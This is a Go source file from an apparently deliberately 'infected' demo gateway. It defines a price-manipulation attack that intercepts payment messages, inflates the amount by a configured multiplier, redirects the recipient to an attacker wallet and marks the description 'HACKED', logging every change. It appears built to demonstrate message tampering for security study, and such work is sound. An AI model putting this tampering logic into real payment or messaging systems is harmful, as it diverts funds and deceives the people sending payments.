package attacks

import (
	"time"

	"github.com/sage-x-project/sage-gateway-infected-for-demo/config"
	"github.com/sage-x-project/sage-gateway-infected-for-demo/types"
)

// PriceAttack modifies the price/amount in the message
type PriceAttack struct {
	config *config.Config
}

// NewPriceAttack creates a new price attack handler
func NewPriceAttack(cfg *config.Config) *PriceAttack {
	return &PriceAttack{
		config: cfg,
	}
}

// ModifyMessage applies price manipulation attack
func (a *PriceAttack) ModifyMessage(originalMsg map[string]interface{}) (*types.AttackLog, map[string]interface{}) {
	modifiedMsg := make(map[string]interface{})
	for k, v := range originalMsg {
		modifiedMsg[k] = v
	}

	attackLog := &types.AttackLog{
		Timestamp:   time.Now(),
		AttackType:  string(types.AttackTypePriceManipulation),
		OriginalMsg: originalMsg,
		Changes:     []types.Change{},
	}

	// Modify amount/price field
	if amount, ok := originalMsg["amount"].(float64); ok {
		newAmount := amount * a.config.PriceMultiplier
		modifiedMsg["amount"] = newAmount
		attackLog.Changes = append(attackLog.Changes, types.Change{
			Field:         "amount",
			OriginalValue: amount,
			ModifiedValue: newAmount,
		})
	}

	// Modify recipient to attacker's wallet
	if recipient, ok := originalMsg["recipient"].(string); ok {
		modifiedMsg["recipient"] = a.config.AttackerWallet
		attackLog.Changes = append(attackLog.Changes, types.Change{
			Field:         "recipient",
			OriginalValue: recipient,
			ModifiedValue: a.config.AttackerWallet,
		})
	}

	// Add attacker's description
	if _, ok := originalMsg["description"]; ok {
		originalDesc := originalMsg["description"]
		modifiedMsg["description"] = "HACKED - Redirected to attacker"
		attackLog.Changes = append(attackLog.Changes, types.Change{
			Field:         "description",
			OriginalValue: originalDesc,
			ModifiedValue: "HACKED - Redirected to attacker",
		})
	} else {
		modifiedMsg["description"] = "HACKED - Redirected to attacker"
		attackLog.Changes = append(attackLog.Changes, types.Change{
			Field:         "description",
			OriginalValue: nil,
			ModifiedValue: "HACKED - Redirected to attacker",
		})
	}

	attackLog.ModifiedMsg = modifiedMsg
	return attackLog, modifiedMsg
}

// GetAttackType returns the attack type
func (a *PriceAttack) GetAttackType() types.AttackType {
	return types.AttackTypePriceManipulation
}
